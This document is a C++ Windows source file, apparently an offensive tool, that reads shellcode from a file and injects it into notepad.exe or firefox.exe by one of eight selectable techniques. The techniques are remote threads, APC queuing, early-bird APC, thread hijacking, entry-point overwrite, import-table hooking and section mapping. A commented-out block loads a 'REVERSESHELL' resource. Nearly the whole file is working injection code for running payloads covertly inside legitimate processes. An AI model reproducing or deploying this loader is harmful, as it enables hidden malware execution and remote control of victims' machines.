#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <winternl.h>
#pragma comment(lib, "ntdll")


using myNtTestAlert = NTSTATUS(NTAPI*)();

int option, shellSize = 0;
char* shellCode;
std::string filePath = "";


PROCESS_INFORMATION CreateNotepadProcess() {
	TCHAR szCmdline[] = TEXT("notepad.exe");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;
	// Set up members of the PROCESS_INFORMATION structure. 
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));


	// Create the child process. 

	bSuccess = CreateProcess(NULL,
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		CREATE_NO_WINDOW, // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 
	if (bSuccess == 0) {
		piProcInfo.dwProcessId = -1;
	}
	return piProcInfo;
}

int LoadShellCode() {
	std::ifstream myfile(filePath, std::ios::in | std::ios::binary | std::ios::ate);
	std::streampos size;
	if (myfile.is_open())
	{
		size = myfile.tellg();
		shellCode = new char[size];
		myfile.seekg(0, std::ios::beg);
		myfile.read(shellCode, size);
		shellSize = size;
		myfile.close();
		return 0;
	}
	return 1;
}

void CreateRemoteThread() { /* If notepad are open, inject and exec shellcode. If not, create a notepad*/
	/*Connection gone -> process gone*/
	/* Load && inject && exec shellcode in remote process*/
	/* Need inject right architecture --------------------------------------------------*/
	PROCESS_INFORMATION piProcInfo;
	HANDLE processHandle = NULL;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	PROCESSENTRY32 entry;
	int flag = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	entry.dwSize = sizeof(PROCESSENTRY32);
	piProcInfo.dwProcessId = -1;

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (std::wstring(entry.szExeFile) == L"notepad.exe")
			{
				processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				flag = 1;
			}
		}
	}
	if (flag == 0) { /* create notepad*/
		piProcInfo = CreateNotepadProcess();
		flag = 1;
		if (piProcInfo.dwProcessId != -1) processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, piProcInfo.dwProcessId);
		else	flag = 0;

	}
	if (flag == 0) return;
	Sleep(1000);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	BOOL check = WriteProcessMemory(processHandle, remoteBuffer, shellCode, shellSize, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(snapshot);
	if (piProcInfo.dwProcessId == -1) CloseHandle(processHandle);
}

//void LoadFromResource() {/*Local process gone when connection gone*/
//	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_REVERSESHELL1), L"REVERSESHELL");
//	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
//	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
//
//	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//	memcpy(exec, shellcodeResouceData, shellcodeSize);
//	((void(*)())exec)();
//}

void ApcQueueCodeInjection() {
	/* Process GONE when shellcode been loaded */
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	HANDLE victimProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	HANDLE threadHandle = NULL;

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"firefox.exe") != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}

	victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, shellCode, shellSize, NULL);

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	for (DWORD threadId : threadIds) {
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		Sleep(1000 * 2);
	}
}

void EarlyBirdApcQueueCodeInjection() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	Sleep(1000);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	WriteProcessMemory(victimProcess, shellAddress, shellCode, shellSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);
}


void InjectingRemoteProcessViaThreadHijacking() { /* Remote Process will be suspend for our connetion, connection gone, process gone*/
	HANDLE targetProcessHandle = NULL;
	HANDLE threadHijacked = NULL;
	HANDLE remoteThread;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PVOID remoteBuffer;
	THREADENTRY32 threadEntry;
	CONTEXT context;
	PROCESS_INFORMATION piProcInfo;
	PROCESSENTRY32 entry;
	DWORD targetPID;
	int flag = 0;

	/*Find Processs*/
	entry.dwSize = sizeof(PROCESSENTRY32);
	piProcInfo.dwProcessId = -1;

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (std::wstring(entry.szExeFile) == L"notepad.exe")
			{
				targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				targetPID = entry.th32ProcessID;
				flag = 1;
			}
		}
	}
	if (flag == 0) { /* create notepad if not found*/
		piProcInfo = CreateNotepadProcess();
		flag = 2;
		if (piProcInfo.dwProcessId != -1) {
			targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, piProcInfo.dwProcessId);
			targetPID = piProcInfo.dwProcessId;
		}
		else	flag = 0;

	}
	if (flag == 0) return;
	Sleep(1000);
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, shellSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellCode, shellSize, NULL);


	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);
	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

	SuspendThread(threadHijacked);
	GetThreadContext(threadHijacked, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);
	ResumeThread(threadHijacked);



}

void AddressOfEntryPointCodeInjectionWithoutVirtualAlloc() {

	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD64 pebOffset = (DWORD64)pbi.PebBaseAddress + 16; /*PEB 64 bit*/
	// get target process image base address
	PVOID imageBase;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 8, NULL);
	// read target process image headers
	BYTE headersBuffer[8192] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 8192, NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD64)imageBase);

	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellCode, shellSize, NULL);
	ResumeThread(pi.hThread);
	Sleep(1000);
}

void ImportAdressTableHooking() {
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	LPVOID remoteBuffer;
	CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, 0, 0, 0, &si, &pi);
	remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, remoteBuffer, shellCode, shellSize, NULL);

	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD64 pebOffset = (DWORD64)pbi.PebBaseAddress + 16;

	// get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 8, NULL);

	// read target process image headers
	BYTE Buffer[2048] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, Buffer, 2048, NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)Buffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)Buffer + dosHeader->e_lfanew);

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	LPCVOID address = (LPCVOID)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);

	ZeroMemory(Buffer, sizeof(Buffer));
	ReadProcessMemory(pi.hProcess, address, Buffer, importsDirectory.Size, NULL);
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(Buffer);


	PIMAGE_IMPORT_BY_NAME functionName = NULL;
	while (importDescriptor->Name != NULL)
	{
		BYTE* Buffer_2[4096];

		int offset = 0, fcheck = 0, i = 0;
		PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
		ZeroMemory(Buffer_2, sizeof(Buffer_2));
		ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk), Buffer_2, 1024, NULL);
		originalFirstThunk = (PIMAGE_THUNK_DATA)(Buffer_2 + offset);
		offset = 1024;

		ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)imageBase + importDescriptor->FirstThunk), Buffer_2 + offset, 1024, NULL);
		firstThunk = (PIMAGE_THUNK_DATA)(Buffer_2 + offset);
		offset += 1024;

		while (originalFirstThunk->u1.AddressOfData != NULL)
		{
			ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData), Buffer_2 + offset, 64, NULL);
			functionName = (PIMAGE_IMPORT_BY_NAME)(Buffer_2 + offset);

			if (std::string(functionName->Name).compare("exit") == 0)
			{
				SIZE_T bytesWritten = 0;
				DWORD oldProtect = 0;
				fcheck = VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD_PTR)imageBase + importDescriptor->FirstThunk + i), 8, PAGE_READWRITE, &oldProtect);
				//// swap MessageBoxA address with address of hookedMessageBox	
				Sleep(1000);
				fcheck = WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)imageBase + importDescriptor->FirstThunk + i), &remoteBuffer, 8, NULL);
				Sleep(1000);
			}
			++originalFirstThunk;
			++firstThunk;
			++i;
		}
		importDescriptor++;
	}

}





typedef struct { PVOID UniqueProcess; PVOID UniqueThread; } * PCLIENT_ID;

using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);


void ShareMemoryInjection() {

	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, 0, 0, 0, &si, &pi);
	Sleep(1000);
	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// create a view of the memory section in the target process
	fNtMapViewOfSection(sectionHandle, pi.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, shellCode, shellSize);

	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(pi.hProcess, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
}

void ForciblyMapASectionWritePrimitive() {
	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	
	
	CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, 0, 0, 0, &si, &pi);
	Sleep(1000);
	HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, shellSize, NULL); 
	LPVOID map_addr = MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	
	memcpy(map_addr, shellCode, shellSize);
	LPVOID requested_target_payload = 0; 
	SIZE_T view_size = 0; 
	fNtMapViewOfSection(fm, pi.hProcess, &requested_target_payload, 0, shellSize, NULL, &view_size, 2, 0, PAGE_EXECUTE_READWRITE);
	
	//HANDLE targetThreadHandle = NULL;
	//fRtlCreateUserThread(pi.hProcess, NULL, FALSE, 0, 0, 0, requested_target_payload, NULL, &targetThreadHandle, NULL);
	CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)requested_target_payload, NULL, 0, NULL);
}

int main(int argv, char* argc[])
{
	if (argv != 5 || std::string(argc[1]) != "-f" || std::string(argc[3]) != "-t") return 0;
	filePath = argc[2];
	option = atoi(argc[4]);

	if (LoadShellCode() != 0) return 0;
	switch (option) {
	case 1:
		CreateRemoteThread();
		break;
	case 2:
		ApcQueueCodeInjection();
		break;
	case 3:
		EarlyBirdApcQueueCodeInjection();
		break;
	case 4:
		InjectingRemoteProcessViaThreadHijacking();
		break;
	case 5:
		AddressOfEntryPointCodeInjectionWithoutVirtualAlloc();
		break;
	case 6:
		ImportAdressTableHooking();
		break;
	case 7:
		ShareMemoryInjection();
		break;
	case 8:
		ForciblyMapASectionWritePrimitive();
		break;
	}


}

